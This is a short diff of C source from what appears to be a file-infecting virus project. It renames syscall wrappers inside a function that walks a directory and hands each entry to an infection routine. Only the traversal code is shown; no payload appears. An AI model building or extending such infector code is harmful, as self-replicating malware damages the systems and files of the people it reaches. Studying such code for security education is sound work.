@@ -40,15 +40,15 @@ static void	browse_dirent(char path[PATH_MAX], char *path_end, \
 static void	infect_files_at(char path[PATH_MAX], char *path_end, uint64_t seed[2])
 {
 	char		buff[1024];
-	int		fd = famine_open(path, O_RDONLY);
+	int		fd = sys_open(path, O_RDONLY);
 	int		nread;
 
 	if (fd == -1) return;
 
 	*path_end++ = '/';
-	while ((nread = famine_getdents64(fd, (void*)buff, 1024)) > 0)
+	while ((nread = sys_getdents64(fd, (void*)buff, 1024)) > 0)
 		browse_dirent(path, path_end, buff, nread, seed);
-	famine_close(fd);
+	sys_close(fd);
 }
 
 inline void		infect_files_in(const char *root_dir, uint64_t seed[2])
